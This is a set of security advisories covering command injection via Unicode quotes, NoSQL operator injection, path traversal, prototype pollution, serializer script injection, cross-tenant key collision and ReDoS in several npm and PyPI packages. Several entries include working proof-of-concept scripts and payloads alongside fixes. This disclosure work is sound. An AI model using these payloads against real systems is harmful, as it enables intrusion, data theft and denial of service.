entry.title: [systeminformation] systeminformation vulnerable to Windows command injection in services() through Unicode quotation marks
entry.content:
Summary

On Windows, systeminformation@5.33.15 builds a PowerShell command using the value passed to services(). The default sanitizer removes ASCII quotes but keeps Unicode curly quotes, spaces, and parentheses. A crafted service name can use those characters to break out of the generated filter string and run a PowerShell expression. The expression runs with the permissions of the Node.js process.

This report confirms version 5.33.15. Other package versions have not been checked.

Details

In lib/processes.js, services() sanitizes the caller's string with sanitizeShellString() and later inserts each resulting name into a Get-CimInstance Win32_Service -Filter command. The Windows branch passes that command to util.powerShell().

The sanitizer in lib/util.js removes the ASCII double quote, but it does not remove U+201C or U+201D, the left and right curly double quotation marks. It also permits spaces and parentheses when called in its default, non-strict mode. PowerShell accepts the curly marks as string delimiters, so an input can end the filter string and place a command expression in the generated command.

For example, the input below uses curly quotation marks to end the generated filter string and execute New-Item. I reproduced this call on Windows against the checked-out systeminformation@5.33.15 source; it created a marker file with the Node.js process account.

Proof of concept

Run this on Windows in a disposable directory with Node.js and PowerShell available:

mkdir si-command-injection-repro
cd si-command-injection-repro
npm init -y
npm install systeminformation@5.33.15

Save the following as poc.cjs, then run node poc.cjs:

'use strict';

const fs = require('node:fs');
const path = require('node:path');
const si = require('systeminformation');

(async () => {
  const markerName = `si-injection-${process.pid}.txt`;
  const markerPath = path.join(process.cwd(), markerName);
  fs.rmSync(markerPath, { force: true });

  try {
    await si.services(`not-a-service” (New-Item -Name ${markerName} -ItemType File -Force) “`);
    console.log(`markerCreated=${fs.existsSync(markerPath)}`);
  } finally {
    fs.rmSync(markerPath, { force: true });
  }
})().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});

Expected output:

markerCreated=true

The Windows run returned an array and created the marker (markerCreated: true). A benign input left the marker absent. The script removes the marker afterward. I did not identify an application network route that forwards remote input to services(), so remote exploitability depends on the consuming application.

Impact

An application that passes attacker-controlled input to services() on Windows can execute PowerShell commands with the Node.js process account's permissions. Depending on that account, commands may read or change accessible files, alter application data, or disrupt the service. I searched this repository for HTTP servers, route handlers, and listener calls and found none. services() is exposed through the package API and getDynamicData(), so a consuming application could make the input network-reachable if it forwards request data. A separate loopback HTTP harness did trigger the command through a query parameter, but that server was test code and is not part of this repository. The project's docs/security.html already warns that arbitrary untrusted input to services() needs caution because package sanitization does not cover every case.

entry.title: [@backstage/plugin-catalog-backend] Backstage catalog rules can be bypassed for URL locations using encoded path segments
entry.content:
Summary

@backstage/plugin-catalog-backend matches URL-type locations against catalog.rules location patterns using the raw URL string submitted by the user, while URL readers resolve that same string in canonical form when fetching the location's content. A URL can therefore be crafted so that it appears to belong to a trusted location scope during rule evaluation, but is fetched from a different scope.

Details

When a deployment restricts catalog kinds to trusted URL prefixes using catalog.rules location patterns, DefaultCatalogRulesEnforcer applies glob matching directly to the raw location.target string. The URL readers used for ingestion resolve the same target in canonical form, including normalizing percent-encoded dot segments. A registered location such as https://<host>/trusted/%2e%2e/attacker/repo/blob/main/catalog-info.yaml matches a https://<host>/trusted/** pattern as a raw string, but resolves to and is fetched from https://<host>/attacker/repo/... when its content is read.

An authenticated user with permission to register catalog locations (catalog.location.create) can use this to have an entity from an untrusted source admitted as if it originated from a trusted location scope.

Impact

The crossed boundary is the operator-configured catalog ingestion policy: entity content from outside the trusted location scope is ingested as if it were within it. Downstream consequences depend on deployment configuration, for example actions taken with integration credentials by processors or scaffolder when acting on the ingested entity. The assessment of this report found no basis for impact claims beyond the ingestion policy boundary itself.

Patches

This is fixed in @backstage/plugin-catalog-backend 3.9.2 (Backstage release 1.54.10) and 4.0.2 (Backstage release 1.56.1). Version 4.0.1 as published is not fixed.

Workarounds

No complete workaround is available for deployments that rely on URL location patterns to restrict catalog kinds. Restricting location registration permissions reduces exposure.

References

  • https://github.com/backstage/backstage/security/advisories/GHSA-w658-mh9p-ww8f

entry.title: [@waline/vercel] Waline login accepts a non-string email as a match-all MongoDB query
entry.content:
Summary

The login endpoint POST /api/token reads the email field from the request body without checking its type and passes it straight into the MongoDB storage query. When email is not a string (for example a JSON object such as {"$ne": null}), the MongoDB storage adapter's parseWhere silently DROPS the field rather than rejecting the request, producing an empty filter that matches ALL users. The endpoint then verifies the submitted password against the FIRST user returned (user[0]), which in Waline is the first-registered user — the site administrator.

This is a PARTIAL authentication bypass, not a full one. The attacker still needs a valid password for that first user; this is not a zero-knowledge bypass and it does not disclose passwords. Its concrete effects are: (1) the email/identifier factor is removed for the administrator account, (2) user enumeration (a non-string email never fails the "no such user" branch), and (3) credential-stuffing amplification — an attacker can test a leaked or weak password against the administrator account without knowing the administrator's email.

Details

Untyped input — packages/server/src/controller/token.js:17-18:

    const { email, password, code } = this.post();
    const user = await this.modelInstance.select({ email });

email comes from the request body with no type check.

The storage adapter silently drops a non-string key — packages/server/src/service/storage/mongodb.js, parseWhere():

    if (think.isString(where[k])) { filter[parseKey(k)] = { $eq: ... }; continue; }   // intended guard
    if (where[k] === undefined) { ... }
    if (Array.isArray(where[k]) && where[k][0]) { ... operator handling (IN/LIKE/!=/> ...) }

A plain object such as {"$ne": null} is neither a string, undefined, nor an array, so NONE of the branches run and nothing is added to filter for email. The result is filter = {} -> instance.where({}) -> MongoDB find({}) returns every user. (The array form, e.g. ["!=", ""], is a genuine operator injection that reaches $ne with the same match-all effect.)

First user is selected — token.js:22-26:

    if (think.isEmpty(user) || isVerifyUser || isBannedUser) { return this.fail(); }   // match-all -> not empty -> passes
    const checkPassword = this.checkPassword(password, user[0].password);

user[0] is the first record in MongoDB natural (insertion) order, i.e. the earliest-registered user, which in Waline is the administrator.

No upstream type validation — packages/server/src/logic/token.js:37-38:

    async postAction() { await this.useCaptchaCheck(); }

The only pre-check is the captcha; there is no isString(email/password) validation.

Proof of Concept

Send a login request whose email is a non-string value:

    POST /api/token  HTTP/1.1
    Content-Type: application/json

    {"email": {"$ne": null}, "password": "<password-to-test>"}
  • Because email is not a string, parseWhere adds nothing for it, so the query filter is {} and MongoDB returns all users.
  • user[0] — the first-registered user, i.e. the administrator — is selected, and the submitted password is checked against the administrator's hash.
  • If the password matches (for example via credential stuffing or a known/weak password), the attacker is authenticated as the administrator without ever knowing the administrator's email.
  • Even when the password does not match, the request confirms that users exist (enumeration) and that the email factor is bypassable.

Impact

An unauthenticated attacker can bypass the email/identifier factor of authentication for the first-registered user (the administrator) and have an arbitrary password checked directly against that account. This:

  • enables user enumeration;
  • amplifies credential stuffing against the administrator (no need to know the admin email — a leaked or weak password can be tested directly);
  • and, when the attacker possesses a valid password for that account (e.g. a reused/breached one), results in administrator login.

This is bounded: it is NOT a zero-knowledge authentication bypass, it does NOT reveal passwords, and it targets the first-returned user rather than an arbitrary chosen account. It is rated Medium accordingly. (If exploitation succeeds in logging in, the attacker then holds the administrator session; that downstream impact is conditional on already having a valid password, which is reflected in the High attack complexity rather than in the confidentiality/integrity metrics.)

Remediation

Validate the types of email and password as strings before they reach the storage query — for example in packages/server/src/logic/token.js postAction():

    const { email, password } = this.post();
    if (!think.isString(email) || !think.isString(password)) {
      return this.ctx.throw(400, 'Invalid input type');
    }

Defense in depth: in mongodb.js parseWhere(), reject (rather than silently drop) a value that is neither a string nor a supported array form, or coerce it to {$eq: String(value)}, so a non-string key can never elide the filter.

References

  • https://github.com/walinejs/waline/pull/3646
  • https://github.com/walinejs/waline/commit/e611aed4e571c2a86103f5cee48791ca6b460360
  • https://github.com/advisories/GHSA-jf75-q64q-g65r

entry.title: [seroval] Seroval: Code injection through a typed array's own constructor property
entry.content:
Summary

seroval writes a typed array as a call to its constructor. In affected versions, the constructor name in the output is read from a property that data on the value can replace, and it is written without checks. A typed array that received properties from untrusted data can then put arbitrary code into the serialized output.

Details

Version 1.6.0 changed how seroval finds the class of an object, so that objects with their own constructor property serialize correctly. Typed arrays still took the constructor name from the value itself, so the name could come from the untrusted property instead of the array's real type.

These functions are affected:

  • serialize, serializeAsync
  • crossSerialize, crossSerializeAsync, crossSerializeStream
  • the Serializer class
  • compileJSON

fromJSON and fromCrossJSON are not affected: they only accept the names of the built-in typed arrays. With the compactArrayBufferViews option, the same lookup throws a TypeError instead of writing code.

Impact

An application is affected only when it serializes a typed array that has an own constructor property set from untrusted data. That requires code that copies properties from untrusted objects onto a typed array. This is unusual, so the severity is rated Low, even though the result is script execution in the page that receives the output.

Patches

Fixed in 1.6.11. The constructor name now comes from the array's internal type, which properties on the value cannot change. compactArrayBufferViews uses the real type as well.

Workarounds

If you cannot upgrade, do not copy properties from untrusted objects onto typed arrays, or remove an own constructor property from a typed array before serializing it.

References

  • https://github.com/lxsmnsyc/seroval/security/advisories/GHSA-f86p-h4j2-7qgj
  • https://nvd.nist.gov/vuln/detail/CVE-2026-116583
  • https://github.com/lxsmnsyc/seroval/commit/1313ebbad9687bc0245e08bfd576376e57e0e5c1
  • https://github.com/lxsmnsyc/seroval/releases/tag/seroval@1.6.11
  • https://github.com/advisories/GHSA-f86p-h4j2-7qgj

entry.title: [seroval] Seroval: Script injection through RegExp sources in serialized output
entry.content:
Summary

seroval writes a RegExp as a regular expression literal. In affected versions, the < character in a RegExp source is written without escaping. A source built from untrusted input can then end the HTML <script> element that the serialized output is placed in, and run script in the page.

Details

seroval escapes < in strings, so string values cannot end a <script> element. RegExp sources did not get the same escaping:

  • Versions before 1.0.0 wrote the source as is.
  • Version 1.5.5 stopped escaping < in RegExp sources, so that named groups and lookbehinds keep working. This removed the escaping for every < in a source.

These functions are affected:

  • serialize, serializeAsync
  • crossSerialize, crossSerializeAsync, crossSerializeStream
  • the Serializer class
  • compileJSON

toJSON, fromJSON, toCrossJSON and fromCrossJSON are not affected, because they never produce JavaScript.

Impact

An application is affected when all of these are true:

  1. It builds a RegExp from untrusted input that is used as regular expression syntax. Input passed through an escaping helper (such as an escapeRegExp function) is not enough to exploit this.
  2. It serializes that RegExp with one of the functions above.
  3. It places the output inside an HTML <script> element, as server rendering usually does.

In that case an attacker can run script in the page of any user who receives that output.

Patches

Fixed in 1.6.10. A RegExp whose source contains < is now written with the RegExp constructor and an escaped string source. Named groups and lookbehinds keep working.

Workarounds

If you cannot upgrade:

  • Do not serialize a RegExp built from untrusted pattern syntax. Send its source and flags as strings, and build the RegExp on the client.
  • Or reject patterns that contain < before they reach the serializer.

References

  • https://github.com/lxsmnsyc/seroval/security/advisories/GHSA-9wx9-5pv9-3349
  • https://nvd.nist.gov/vuln/detail/CVE-2026-116582
  • https://github.com/lxsmnsyc/seroval/commit/f94ee0b63936dae954ff50d5b5e8ea7cb9b284e6
  • https://github.com/lxsmnsyc/seroval/releases/tag/seroval@1.6.10

entry.title: [seroval] Seroval: fromJSON deserializer trusts node-supplied array length and sequence doneAt (unauthenticated event-loop DoS)
entry.content:
Summary

fromJSON and fromCrossJSON used two node fields without checking them.

  • An array node's element list was not checked to be an array. A small payload could set the length the decoder looped over. This part is also tracked in GHSA-wp97-x4hv-qvhp.
  • A sequence node's done index was not checked. A crafted value produced an iterator that never finished.

Impact

A service that passes untrusted input to fromJSON or fromCrossJSON can be made unavailable by an unauthenticated request.

  • The array case blocks the thread while the decoder runs.
  • The sequence case makes any code that reads the resulting iterator to the end run forever.

Patches

Fixed in seroval@1.6.8.

  • Element lists must be arrays.
  • A sequence node's throw and done indices must be integers from -1 up to the last element index.

Invalid input throws SerovalMalformedNodeError.

Workarounds

None. Upgrade to 1.6.8.

References

  • https://github.com/lxsmnsyc/seroval/security/advisories/GHSA-97r2-qh9m-474h
  • https://nvd.nist.gov/vuln/detail/CVE-2026-116581
  • https://github.com/lxsmnsyc/seroval/commit/cdcee3e3bc384ee844360844f8ea98fd2b275d69

entry.title: [seroval] Seroval `fromJSON`/`fromCrossJSON` denial of service via unvalidated array node length
entry.content:
Summary

fromJSON and fromCrossJSON did not check that an array node's element list is an array. A small crafted payload could set the length the decoder used. That length controlled how much memory was allocated and how many times the decoder looped, and it did not depend on the size of the payload.

Impact

A service that passes untrusted input to fromJSON or fromCrossJSON can be made unavailable by an unauthenticated request.

  • A small payload can allocate enough memory to end the process.
  • A small payload can block the thread for seconds, or without end.

This affects any framework that decodes request bodies with these functions before its own validation runs.

This issue is a bypass of the fix for GHSA-66fc-rw6m-c2q6 in 1.4.1.

Patches

Fixed in seroval@1.6.8. The deserializer now rejects any node whose element list is not an array, and throws SerovalMalformedNodeError.

Workarounds

None. Upgrade to 1.6.8.

  • https://github.com/lxsmnsyc/seroval/security/advisories/GHSA-wp97-x4hv-qvhp

entry.title: [seroval] Seroval: Deserialization invokes attacker-chosen callables: AsyncIteratorFactoryInstance calls source.on(listener) without type check
entry.content:
Summary

When fromJSON rebuilt an async iterator, it called on() on the iterator's source without checking that the source was a seroval stream. A crafted payload could pick another value as the source, such as a function returned by an application plugin. The deserializer then called that value's on method.

This is a variant of GHSA-mv8w-475r-vwqw. That fix covered the promise and stream control nodes but not the async iterator node.

Impact

An application that passes untrusted input to fromJSON with plugins that return callable values can have those callables invoked during deserialization. What this allows depends on what the plugin's values do.

Affected versions

  • Versions up to 1.6.3 accept any value as the source.
  • 1.6.4 rejects the reported payload.
  • 1.6.5 to 1.6.7 check the source by node type, which a payload can get around by reusing a node id.
  • All versions up to 1.6.7 should be treated as affected.

Patches

Fixed in seroval@1.6.8. Streams and sequences are now internal class instances. The deserializer checks the source value with instanceof, so plain data and plugin values are rejected no matter which node id they use.

Workarounds

Avoid plugins whose deserialize returns functions or objects with an on method when decoding untrusted input. Upgrading to 1.6.8 is recommended.

References

  • https://github.com/lxsmnsyc/seroval/security/advisories/GHSA-7rv5-mrxv-xcr9

entry.title: [mem0ai] Mem0: Cross-tenant conversation leak via unescaped delimiter collision in session-scope key (_build_session_scope)
entry.content:
Summary

_build_session_scope() in mem0/memory/main.py builds the conversation-history scope key used to fetch/store the last N raw messages by naively joining caller-supplied user_id/agent_id/run_id values with unescaped & and = delimiters:

def _build_session_scope(filters): parts = [] for key in sorted(["user_id", "agent_id", "run_id"]): val = filters.get(key) if val: parts.append(f"{key}={val}") return "&".join(parts)

_validate_and_trim_entity_id() (the only validation applied to these values) rejects only empty/whitespace-only strings — it never forbids & or =. This scope string is then used as an exact-match key against a SQLite column (storage.py: WHERE session_scope = ?) to fetch the last 10 raw messages for a given scope (main.py, Phase 0 of _add_to_vector_store, both sync and async).

Impact

Any caller who controls only their own run_id (or agent_id) — a very common integration shape, since apps frequently pass a client-/session-supplied identifier straight through as run_id without namespacing — can craft a value containing &user_id= (or &agent_id=) that produces a scope string byte-for-byte identical to a different tenant's real scope string.

Concretely: Tenant A calls add(msgs, user_id="alice", run_id="proj-x") → scope "run_id=proj-x&user_id=alice". An attacker who can only set run_id calls add(msgs, run_id="proj-x&user_id=alice") → identical scope string. The attacker's next add() call:

  1. Reads Tenant A's raw prior conversation via get_last_messages(session_scope) and splices it verbatim into the attacker's own LLM fact-extraction prompt — a direct cross-tenant confidentiality leak (conversation content, potentially including PII, credentials, etc.).
  2. Writes into the same colliding row-set via save_messages(), whose eviction logic (DELETE FROM messages WHERE session_scope = ? AND id NOT IN (...)) can evict/interleave Tenant A's history — permanent cross-tenant data corruption, not just a read.

Reachable via the public Memory.add() / AsyncMemory.add() API, and by extension the REST server's POST /memories endpoint (which takes run_id/agent_id straight from the request body).

Reproduction

from mem0.memory.main import _build_session_scope

Tenant A: real user_id + run_id

scope_a = _build_session_scope({"user_id": "alice", "run_id": "proj-x"}) print(scope_a) # "run_id=proj-x&user_id=alice"

Attacker: controls only run_id, embeds a fake user_id inside it

scope_c = _build_session_scope({"run_id": "proj-x&user_id=alice"}) print(scope_c) # "run_id=proj-x&user_id=alice"

assert scope_a == scope_c # byte-for-byte collision

A full end-to-end proof (actual add() calls, no mocking of the vulnerable functions) confirms the attacker's subsequent add() call receives the victim's raw prior message content via get_last_messages.

Suggested Fix

Reject & and = in _validate_and_trim_entity_id(), alongside the existing whitespace check — this is the single validation chokepoint already used by every entry point (add, search, get_all, delete_all), so the fix is centralized. Alternatively/additionally, encode each component unambiguously (percent-encode each id, or use a length-prefixed/JSON-encoded scope key) so no valid-character combination in one field can ever collide with a different partition.

Also affected: TypeScript SDK (npm mem0ai)

The same flaw exists in mem0-ts/src/oss/src/memory/index.ts, Memory.buildSessionScope(), which joins agent_id/run_id/user_id into the same key=value&key=value string with the delimiters unescaped:

private buildSessionScope(filters: SearchFilters): string { const parts: string[] = []; for (const key of ["agent_id", "run_id", "user_id"].sort()) { const val = (filters as any)[key]; if (val) parts.push(${key}=${val}); } return parts.join("&"); }

The scope string is used the same way, as an exact-match key into the messages table via SQLiteManager.getLastMessages() and saveMessages(), so the identical forge, cross-tenant read and eviction all apply.

Verified against the current releases as of 2026-07-26: pip mem0ai v2.0.14 and npm mem0ai ts-v3.1.2 both still contain the unescaped join.

Reporter: Abhinav Singh (GitHub: OfficialAbhinavSingh)

entry.title: [systeminformation] systeminformation has path traversal in Linux networkStats() that allows symlink-based file disclosure outside /sys/class/net
entry.content:
Summary

On Linux, systeminformation@5.33.13 builds /sys/class/net/<iface> paths from the caller-supplied networkStats(iface) value without checking that the resolved path stays inside /sys/class/net. A caller who can create a symlink fixture and control the value passed to this API can make the function return the first line of a file readable by the Node process.

Details

The strict string sanitizer removes shell metacharacters but retains / and .. The Linux implementation uses this value in an fs.existsSync('/sys/class/net/' + iface) check and then in seven cat paths for interface statistics. Both operations follow .. path components and symlinks. The code does not validate the value as an interface name or enforce resolved-path containment.

The proof of concept below creates the expected statistics files in a directory writable by the unprivileged nobody user. Its operstate symlink points to a synthetic mode-0600 file under /root. The package call runs as root and returns the marker even though nobody cannot read that file.

PoC

Use a disposable Ubuntu Linux VM with Node.js, npm, and runuser installed. These steps create and remove only a synthetic marker and a temporary fixture. Install the affected version:

mkdir si-netstats-repro
cd si-netstats-repro
npm init -y
npm install systeminformation@5.33.13

Save the following as poc.cjs in that directory, then run sudo node poc.cjs:

'use strict';

const fs = require('node:fs');
const { execFileSync } = require('node:child_process');
const si = require('systeminformation');

const root = `/tmp/si-netstats-${process.pid}`;
const secret = `/root/si-netstats-secret-${process.pid}`;
const marker = `SYNTHETIC_ROOT_ONLY_MARKER_${process.pid}`;
const fixtureCode = `
  const fs = require('node:fs');
  const root = process.env.SI_FIXTURE_ROOT;
  const secret = process.env.SI_SECRET;
  fs.mkdirSync(root + '/statistics', { recursive: true });
  for (const name of ['rx_bytes', 'tx_bytes', 'rx_dropped', 'rx_errors', 'tx_dropped', 'tx_errors']) {
    fs.writeFileSync(root + '/statistics/' + name, '0\\n');
  }
  fs.symlinkSync(secret, root + '/operstate');
`;

(async () => {
  try {
    fs.writeFileSync(secret, marker + '\\n', { mode: 0o600 });
    fs.chmodSync(secret, 0o600);

    execFileSync('runuser', [
      '-u', 'nobody', '--', 'env',
      `SI_FIXTURE_ROOT=${root}`,
      `SI_SECRET=${secret}`,
      process.execPath, '-e', fixtureCode
    ], { stdio: 'inherit' });

    let nobodyCouldRead = true;
    try {
      execFileSync('runuser', ['-u', 'nobody', '--', 'cat', secret], { stdio: 'ignore' });
    } catch {
      nobodyCouldRead = false;
    }
    if (nobodyCouldRead) throw new Error('negative control failed: nobody read the marker');

    const iface = '../'.repeat(24) + root.slice(1);
    const rows = await si.networkStats(iface);
    const returned = String(rows[0]?.operstate ?? '').trim();
    const success = returned === marker;

    console.log(JSON.stringify({
      nobodyCouldRead,
      libraryReturnedRootOnlyMarker: success,
      returnedOperstate: returned
    }, null, 2));

    if (!success) process.exitCode = 1;
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
    fs.rmSync(secret, { force: true });
  }
})().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});

Expected result:

{
  "nobodyCouldRead": false,
  "libraryReturnedRootOnlyMarker": true,
  "returnedOperstate": "SYNTHETIC_ROOT_ONLY_MARKER_<pid>"
}

Impact

The demonstrated impact is disclosure to the API caller of the first line of a file readable by the Node process. The package is a library and does not expose a network endpoint. A consuming application route that forwards remote attacker input to this API and returns its result was not established, so remote exploitability is not demonstrated.

entry.title: [systeminformation] systeminformation has prototype pollution in `networkStats()` via the interface name
entry.content:
Summary

networkStats() keeps a per interface cache for computing rx_sec / tx_sec between calls. The cache is a plain JavaScript object and is indexed with the interface name the caller supplied. Passing the name __proto__ makes every cache write land on Object.prototype instead of the cache, polluting every object in the Node.js process.

An application is affected if it passes untrusted input as the ifaces argument of si.networkStats() and runs on FreeBSD, OpenBSD or NetBSD.

Details

The vulnerable code

lib/network.js declares the cache as a plain object:

const _network = {};

calcNetworkSpeed() writes into it, keyed by the interface name:

} else {
  if (!_network[iface]) {
    _network[iface] = {};
  }
  _network[iface].rx_bytes  = rx_bytes;
  _network[iface].tx_bytes  = tx_bytes;
  _network[iface].rx_sec    = null;
  _network[iface].tx_sec    = null;
  _network[iface].ms        = Date.now();
  _network[iface].last_ms   = 0;
  _network[iface].operstate = operstate;
}

With iface === '__proto__' this misbehaves twice:

  1. _network['__proto__'] does not read a missing own property — it invokes the inherited __proto__ getter and returns Object.prototype, which is truthy. The if (!_network[iface]) guard therefore never creates the {} placeholder.
  2. Each following assignment writes onto Object.prototype.

After one call, rx_bytes, tx_bytes, rx_sec, tx_sec, ms, last_ms and operstate are visible on every object in the process. A second call takes the other branch (_network['__proto__'].ms is now truthy) and keeps them updated.

Why the existing sanitizing does not help

The interface name does pass through util.sanitizeString(iface, true) before it is used as the cache key. That function is a shell metacharacter filter, built to stop command injection in the netstat / ifconfig invocations — a different threat. Property names made of letters and underscores are legitimate interface names and pass through untouched:

"a;id"        -> "aid"
"a$(id)"      -> "aid"
"a|id"        -> "aid"
"a`id`"       -> "aid"
"__proto__"   -> "__proto__"     <-- unchanged
"constructor" -> "constructor"   <-- unchanged

The sanitizer is doing its job; the gap is that no layer treats the value as an object key.

Reachability

The cache write is guarded incidentally on three of four platform branches. These guards exist for unrelated reasons and are not a deliberate defence:

Platform Code path Reachable with an arbitrary name?
Linux / Android fs.existsSync('/sys/class/net/' + ifaceSanitized) No — a non-existent interface returns early
macOS requires netstat to emit a data row beyond the header No — verified on macOS 27, Object.prototype stays clean
Windows if (rx_bytes && tx_bytes) — requires a real adapter match No
FreeBSD / OpenBSD / NetBSD if (!error) { …; result = calcNetworkSpeed(ifaceSanitized, …) } Yes — the call sits outside the parsing loop, so any successful netstat exit reaches it, and netstat -ibndI <unknown> prints only its header and exits 0

The important part is not that three platforms happen to be safe, but that nothing in the design prevents the write. Any future platform branch without such a guard reopens the issue, which is why the fix is applied at the cache rather than at the call sites.

Age

The pattern predates the v5 line — git log -S "_network[iface] = {}" traces it back to a refactoring before v3.42.5. The v3 and v4 lines are end of life; the advisory covers v5.

Impact

The attacker controls which attributes appear on Object.prototype but not their values — those come from the interface statistics (rx_bytes, ms, operstate …). The attribute names are fixed by the library, so this is not an arbitrary-key pollution primitive.

The consequences are therefore application specific and arise from name collisions:

  • Any application code that tests if (obj.operstate), if (obj.ms) or similar on an object that should not have those properties now takes the wrong branch.
  • for…in loops over plain objects gain seven extra enumerable keys, which can corrupt serialisation, configuration merging or validation logic.
  • Libraries that use {} as a lookup map and check membership with in or truthiness can return values for keys that were never inserted.

No path to remote code execution is known, and the values cannot be chosen by the attacker.

Proof of concept

The underlying primitive (any platform)

const { calcNetworkSpeed } = require('systeminformation/lib/network.js'); // internal
const cache = {};                       // the declaration used by the library
calcNetworkSpeed('__proto__', 1, 2, 'up', 0, 0, 0, 0);

console.log({}.rx_bytes);               // 1
console.log({}.operstate);              // 'up'
console.log(Object.prototype.hasOwnProperty('rx_bytes')); // true

End to end through the public API (FreeBSD / OpenBSD / NetBSD)

const si = require('systeminformation');

(async () => {
  console.log('before:', {}.operstate);   // undefined
  await si.networkStats('__proto__');     // an attacker supplied interface name
  console.log('after :', {}.operstate);   // 'up'  -> Object.prototype is polluted
})();

On Linux, macOS and Windows the same call returns an empty result set and leaves Object.prototype untouched, for the reasons in the Reachability table.

Patch

lib/network.js — give the cache a null prototype, so __proto__ becomes an ordinary own property instead of a setter into the prototype chain:

-const _network = {};
+const _network = Object.create(null);

This is the smallest change that fixes the class of problem rather than one reachable path:

  • It is independent of the platform branches, so no guard has to be added or maintained.
  • It keeps behaviour identical for every legitimate interface name — Object.keys(), member reads and writes all work unchanged on a null prototype object.
  • It matches the pattern already used elsewhere in the codebase (lib/filesystem.js:114-115, lib/graphics.js:1060, lib/graphics.js:1087).
  • Object.create is ES5.1, well below the declared engines.node >= 10.0.0.

After the patch the hostile name is stored as a normal cache entry:

const cache = Object.create(null);
// ... cache['__proto__'] holds the stats object, Object.prototype is untouched

Workarounds

For users who cannot upgrade immediately, either of these is sufficient:

  1. Validate the interface name before calling — accept only names returned by si.networkInterfaces(), or reject the names __proto__, constructor and prototype.
  2. Never pass untrusted input as the ifaces argument. Passing '*' or omitting the argument is unaffected, because those names come from the system rather than the caller.

Freezing Object.prototype (Object.freeze(Object.prototype)) also prevents the write, but it has wide-reaching side effects on other dependencies and is not recommended as a general mitigation.

Affected versions

All 5.x releases up to and including 5.33.12. Earlier major lines contain the same pattern but are end of life.

What was verified, and what was not

Verified on this machine (macOS 27, Node 24):

  • the pollution primitive, by calling the cache write with iface = '__proto__';
  • that util.sanitizeString('__proto__', true) returns the string unchanged, while shell metacharacters are stripped;
  • that unpatched v5 on macOS does not pollute through the public API;
  • that netstat -bdnI <unknown-interface> prints only its header and exits 0;
  • that the patch stores the hostile key as an own property and leaves Object.prototype clean.

Not verified, because no such host was available:

  • end to end exploitation on FreeBSD, OpenBSD or NetBSD. That conclusion is derived from reading the BSD branch of networkStatsSingle() — where the calcNetworkSpeed() call sits outside the row parsing loop and is reached whenever netstat exits successfully — combined with the observed netstat exit behaviour above. Worth confirming on a BSD host before publishing, since the affected-platform list depends on it.

References

  • https://github.com/sebhildebrandt/systeminformation/security/advisories/GHSA-7648-jmwf-vw7j
  • https://nvd.nist.gov/vuln/detail/CVE-2026-116674
  • https://github.com/sebhildebrandt/systeminformation/commit/6ff25a1ebc0b1fdc7a8aa3507e46f22007da2969
  • https://github.com/sebhildebrandt/systeminformation/releases/tag/v5.33.13
  • https://github.com/advisories/GHSA-7648-jmwf-vw7j

entry.title: [graphql-scalars] graphql-scalars PhoneNumber scalar is vulnerable to regular expression denial of service
entry.content:
Summary

The regular expression behind GraphQLPhoneNumber since 1.24.1 backtracks exponentially. A string made of a run of digits followed by one character that makes the match fail (for example "1".repeat(30) + "x") blocks the JavaScript thread for seconds, and every additional digit doubles the time.

graphql-js calls parseLiteral while validating a document and parseValue while coercing variables, so the regex runs for every request that merely contains such a value in a PhoneNumber position, before execution and before any authentication or authorization step of the server. One small unauthenticated request is enough to stall a server process.

Affected versions

  • graphql-scalars >= 1.24.1, <= 2.0.0 (2.0.0 is the current latest; the default branch still has the same pattern).
  • Not affected: 1.24.0 and the earlier versions I checked (1.22.4, 1.23.0), which use the linear /^\+[1-9]\d{6,14}$/.
  • Introduced by #2719 (c7f58da16, "PhoneNumber scalar is not fully compatible with E.164 format so updated regex to support phone number with extension"), released as 1.24.1 on 2025-01-29.

The payload was ran against 1.22.4, 1.23.0, 1.24.0, 1.24.1, 1.24.2, 1.25.0, 1.26.0 and 2.0.0: the first three reject it instantly, the other five show the exponential growth.

Root cause

src/scalars/PhoneNumber.ts:

const PHONE_NUMBER_REGEX = /^\+?\d{1,3}(\-|\x20)?\(?\d+\)?((\-|\x20)?\d+)+$/;

In \d+\)?((\-|\x20)?\d+)+$ the separator is optional, so a run of n digits can be split across the inner \d+ and the outer + iterations in a number of ways that is exponential in n. When the overall match fails, for instance on a trailing non-digit, the engine tries all of them.

Proof of concept

  1. The scalar alone (npm i graphql graphql-scalars@2.0.0):
import { GraphQLPhoneNumber } from 'graphql-scalars';

for (const ok of ['+41791234567', '079 123 45 67', '+1 (123) 456-7890', 'nope']) {
  try { GraphQLPhoneNumber.parseValue(ok); } catch {}
}
for (const digits of [24, 26, 28, 30]) {
  const start = performance.now();
  try { GraphQLPhoneNumber.parseValue('1'.repeat(digits) + 'x'); } catch {}
  console.log(`${digits} digits: ${((performance.now() - start) / 1000).toFixed(2)} s`);
}

Measured warm, i.e. after ordinary inputs have been validated like in a running server:

digits Node 22.19.0 Node 26.10.0
24 0.10 s 0.07 s
26 0.41 s 0.29 s
28 1.63 s 1.14 s
30 6.59 s 4.62 s

The time doubles with every digit. The first execution of the regex in a fresh process is about 5x slower because V8 interprets a regexp on its first run (Node 22.19.0, 28 digits: 7.8 s).

  1. Through graphql-js, no server and no authentication: a schema with a single echo(phone: PhoneNumber) field, 26 digits + x, Node 22.19.0, warm:
literal (parseLiteral, validation) variable (parseValue, coercion)
graphql 16.14.2 0.41 s 0.43 s
graphql 17.0.2 0.41 s 0.83 s (evaluated twice)
  1. Also reproduced end to end against a GraphQL Yoga server: an anonymous HTTP request with a 27-digit value plus one invalid character stalled the whole process (a concurrent trivial { __typename } request waited as long). A mutation that requires authentication was affected equally when called anonymously, because document validation runs before any authorization in resolvers or context.

Impact

Denial of service. Any GraphQL server that exposes PhoneNumber on an argument, an input object field or a variable can be stalled by a request of about 30 characters; roughly 40 characters would keep a process busy for hours (extrapolated from the doubling, not measured). serialize uses the same regex, so unvalidated stored values returned through a PhoneNumber field are affected too. The actual severity depends on the scalar being applied to untrusted input, which is the typical case.

Suggested fix

An equivalent pattern without ambiguous splits:

const PHONE_NUMBER_REGEX = /^\+?\d{1,3}[- ]?\(?\d(?:\d*\))?(?:[- ]?\d)+$/;

It accepts exactly the same strings as the current one, so there is no behaviour change: with N = (S?\d+)+ = (S?\d)+ a digit run is just repeated single-digit iterations, hence \d+\)?N = \d(\d*\))?N. Verification:

  • exhaustive comparison of old and new pattern on every string up to length 9 over 1 + - space ( ) x: 47,079,208 strings (1,832 accepted), 0 differences;
